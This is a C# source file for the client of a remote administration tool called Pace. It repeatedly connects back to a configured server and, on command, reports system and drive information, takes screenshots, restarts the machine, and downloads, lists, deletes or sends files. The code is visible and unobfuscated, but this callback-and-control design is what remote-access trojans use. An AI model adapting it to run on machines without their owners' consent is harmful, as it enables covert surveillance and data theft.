using Pace.Client.Configuration;
using Pace.Client.Handlers;
using Pace.Client.Network;
using Pace.Common.Network;
using Pace.Common.Network.Packets.Server;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace Pace.Client
{
    class Program
    {
        private PaceClient client;
        private bool isConnected;

        static void Main(string[] args) => new Program().Run();

        private void Run()
        {
            client = new PaceClient();
            client.PacketReceived += Client_PacketReceived;
            client.PacketSent += Client_PacketSent;

            var packetChannel = new PacketChannel();

            packetChannel.RegisterHandler<GetSystemInfoRequestPacket>(SystemHandlers.HandleGetSystemInfo);
            packetChannel.RegisterHandler<GetDrivesRequestPacket>(SystemHandlers.HandleGetDrives);
            packetChannel.RegisterHandler<TakeScreenshotRequestPacket>(SystemHandlers.HandleTakeScreenshot);
            packetChannel.RegisterHandler<RestartRequestPacket>(SystemHandlers.HandleRestart);

            packetChannel.RegisterHandler<DownloadFileRequestPacket>(FileHandlers.HandleDownloadFile);
            packetChannel.RegisterHandler<GetDirectoryRequestPacket>(FileHandlers.HandleGetDirectory);
            packetChannel.RegisterHandler<DeleteFileRequestPacket>(FileHandlers.HandleDeleteFile);
            packetChannel.RegisterHandler<SendFileRequestPacket>(FileHandlers.HandleSendFile);

            TryConnect();

            while (isConnected)
            {
                try
                {
                    var packet = client.ReadPacket();
                    packetChannel.HandlePacket(client, packet);
                }
                catch (IOException ex)
                {
                    if (ex.InnerException == null)
                    {
                        throw ex;
                    }

                    if (ex.InnerException.GetType() == typeof(SocketException))
                    {
                        var socketException = (ex.InnerException as SocketException);

                        if (socketException.ErrorCode == (int)SocketError.ConnectionReset)
                        {
                            PrintDebug("Disconnected!");
                            TryConnect();
                        }
                    }
                }
            }

            Console.ReadKey();
        }

        private void Client_PacketReceived(object sender, EventArgs e)
        {
            PrintDebug("Packet received.");
        }

        private void Client_PacketSent(object sender, EventArgs e)
        {
            PrintDebug("Packet sent.");
        }

        public void TryConnect()
        {
            isConnected = false;

            PrintDebug("Waiting for Server...");

            while (!client.TcpClient.Connected)
            {
                try
                {
                    client.Connect(IPAddress.Parse(ClientConfiguration.Host), ClientConfiguration.Port);
                }
                catch (Exception)
                {
                    continue;
                }
            }

            isConnected = true;

            PrintDebug("Connected!");
        }

        public void PrintDebug(string message)
        {
            Console.WriteLine($"[DEBUG]: {message}");
        }
    }
}